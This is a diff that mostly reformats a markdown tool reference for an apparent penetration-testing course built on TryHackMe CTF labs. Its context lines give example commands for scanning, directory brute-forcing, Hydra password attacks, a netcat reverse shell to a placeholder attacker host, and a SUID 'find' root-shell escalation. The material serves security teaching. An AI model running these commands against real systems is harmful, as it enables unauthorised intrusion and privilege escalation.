@@ -55,16 +55,19 @@ flowchart TD
 ## Platform
 
 ### Kali Linux
+
 Debian-based penetration testing distribution maintained by Offensive Security. Used as the attacker VM throughout the course. Pre-built images distributed via Kali's official download page and via TryHackMe.
 
-- **Official downloads:** https://www.kali.org/get-kali/
+- **Official downloads:** <https://www.kali.org/get-kali/>
 - **TryHackMe Kali image:** pre-configured with the course's standard wordlists and tools
 - **Update cadence:** `sudo apt update && sudo apt full-upgrade -y`
 
 ### VirtualBox
+
 Free hypervisor used for host-level virtualization. Alternative supported: VMware ESXi.
 
 ### TryHackMe
+
 Lab platform hosting the course CTFs. Free tier was sufficient; the paid "Attack Box" (in-browser Kali) was optional.
 
 - **Connection:** OpenVPN profile downloaded from room pages → `sudo openvpn username.ovpn`
@@ -75,9 +78,11 @@ Lab platform hosting the course CTFs. Free tier was sufficient; the paid "Attack
 ## Reconnaissance & Enumeration
 
 ### Nmap
+
 The indispensable port scanner. Used in every lab and both CTFs.
 
 **Canonical invocations:**
+
 ```bash
 # Full-port service/version scan with default scripts (CTF standard)
 sudo nmap -sC -sV -p- -oN nmap_full.txt <target>
@@ -96,6 +101,7 @@ sudo nmap -sn 10.10.0.0/24
 ```
 
 **Flags explained:**
+
 - `-sS` — SYN stealth scan (default when root)
 - `-sV` — service/version detection
 - `-sC` — run default NSE scripts
@@ -105,9 +111,11 @@ sudo nmap -sn 10.10.0.0/24
 - `-oN/-oA/-oX` — output to normal/all-formats/XML
 
 ### Gobuster
+
 Directory and virtual-host brute-forcer. Fast and noisy; good first-pass web enumeration.
 
 **Canonical invocations:**
+
 ```bash
 # Directory enumeration with common wordlist
 gobuster dir -u http://<target> -w /usr/share/dirb/wordlists/common.txt
@@ -120,10 +128,12 @@ gobuster vhost -u http://<target> -w /usr/share/wordlists/dns/subdomains-top1mil
 ```
 
 **Course usage:**
+
 - Pickle Rick: `gobuster dir -u http://10.10.13.213 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt` → `/portal.php` discovered
 - Boiler CTF: `gobuster dir -u http://<target>/joomla/ -w /usr/share/dirb/wordlists/common.txt` → `/joomla/_test` discovered
 
 ### Nikto
+
 Web server vulnerability scanner. Detects outdated software, default files, insecure configurations.
 
 ```bash
@@ -132,6 +142,7 @@ nikto -host http://<target> -port 8080 -Tuning 9
 ```
 
 ### curl
+
 HTTP Swiss Army knife. Used for manual inspection, `robots.txt`, headers, and raw response bodies.
 
 ```bash
@@ -149,6 +160,7 @@ curl -X POST -d "user=admin&pass=admin" http://<target>/login
 ```
 
 ### FTP client
+
 Anonymous FTP login was a repeated theme; on Boiler CTF an anonymous login surfaced a ROT13-encoded `.info.txt`.
 
 ```bash
@@ -164,6 +176,7 @@ get .info.txt
 ## Vulnerability Assessment
 
 ### OpenVAS / Greenbone
+
 Open-source vulnerability scanner. Week 5 lab focus.
 
 - **Installation:** `sudo apt install openvas` (substantial setup time; ~20GB feed sync)
@@ -171,6 +184,7 @@ Open-source vulnerability scanner. Week 5 lab focus.
 - **Default workflow:** Configure → Targets → Tasks → Run → Review Reports
 
 ### JoomScan
+
 OWASP's Joomla vulnerability scanner. Used on Boiler CTF against Joomla 3.9.10.
 
 ```bash
@@ -182,12 +196,14 @@ joomscan --url http://<target>/joomla/
 ```
 
 **What it finds:**
+
 - Joomla version detection
 - Core vulnerability checks
 - Admin / components / modules / templates paths
 - Configuration / status file exposure
 
 ### WPScan
+
 WordPress vulnerability scanner. Applicable to the Mr. Robot CTF WordPress target.
 
 ```bash
@@ -196,6 +212,7 @@ wpscan --url http://<target> -U users.txt -P rockyou.txt
 ```
 
 ### searchsploit / Exploit-DB
+
 Offline mirror of Exploit-DB's published exploit archive.
 
 ```bash
@@ -208,6 +225,7 @@ searchsploit sar2html
 ## Exploitation
 
 ### Metasploit Framework
+
 Modular exploitation framework. Not primary for course CTFs (which emphasized manual methods) but standard in the industry.
 
 ```bash
@@ -219,6 +237,7 @@ exploit
 ```
 
 ### Hydra
+
 Network login brute-forcer. Candidates: SSH, FTP, HTTP forms, RDP, MySQL, PostgreSQL, SMB.
 
 ```bash
@@ -230,6 +249,7 @@ hydra -l admin -P passwords.txt <target> http-post-form "/login.php:user=^USER^&
 ```
 
 ### John the Ripper
+
 Password hash cracker.
 
 ```bash
@@ -241,6 +261,7 @@ john --show hashes.txt
 ```
 
 ### netcat (nc)
+
 TCP/UDP connection tool; reverse-shell listener; port scanner; banner grabber.
 
 ```bash
@@ -256,17 +277,20 @@ nc <attacker> 4444 -e /bin/bash
 ## Post-Exploitation & Privilege Escalation
 
 ### GTFOBins
+
 Curated list of Unix binaries that can be abused for privilege escalation or sandbox escape when installed with SUID or misconfigured sudo rules.
 
-- **Site:** https://gtfobins.github.io/
+- **Site:** <https://gtfobins.github.io/>
 
 **Example from Boiler CTF:**
+
 ```bash
 # SUID find → root shell
 /usr/bin/find . -exec /bin/sh -p \; -quit
 ```
 
 ### LinPEAS / WinPEAS
+
 Automated enumeration scripts for Linux and Windows privilege escalation surface.
 
 ```bash
@@ -277,6 +301,7 @@ chmod +x linpeas.sh
 ```
 
 ### Standard Linux shell primitives (used in Pickle Rick + Boiler)
+
 ```bash
 id                                    # Current user/UID context
 sudo -l                               # Commands runnable as other users
@@ -292,12 +317,15 @@ ls -la /var/log                       # Log file access
 ## Wireless & Physical
 
 ### Wi-Fi Pineapple
+
 Hak5 hardware rogue-AP device. Demonstrated in-class as the canonical example of captive-portal and evil-twin attacks.
 
 ### Flipper Zero
+
 Multi-tool embedded device handling sub-gigahertz radio, RFID/NFC cloning, infrared, 1-Wire, and GPIO. Used for in-class wireless/physical demonstrations.
 
 ### aircrack-ng suite (referenced in Week 11)
+
 ```bash
 airmon-ng start wlan0           # Put interface into monitor mode
 airodump-ng wlan0mon            # Capture wireless traffic
